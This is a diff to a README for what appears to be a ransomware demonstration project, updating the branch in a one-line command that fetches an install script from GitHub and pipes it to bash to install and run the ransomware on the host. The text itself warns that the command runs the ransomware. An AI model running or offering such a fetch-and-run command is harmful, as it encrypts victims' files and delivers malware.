@@ -69,7 +69,7 @@ Note that by default, the ransomware looks for a file named `public_key.pem` at 
 As part of the PoC of delivering a ransomware, we've crafted a shell script `ransomware/scripts/dangerous-install.sh` to install a released version of the `ransomware` along with a `public_key.pem` on a target system. The script can be executed on a remote system with this command:
 ```sh
 # WARNING: THIS WILL RUN THE RANSOMWARE ON THE SYSTEM YOU'RE RUNNING THIS COMMAND ON
-wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/scripts/dangerous-install.sh | bash
+wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/scripts/dangerous-install.sh | bash
 ```
 
 ### Paying the ransom (decrypting your files)
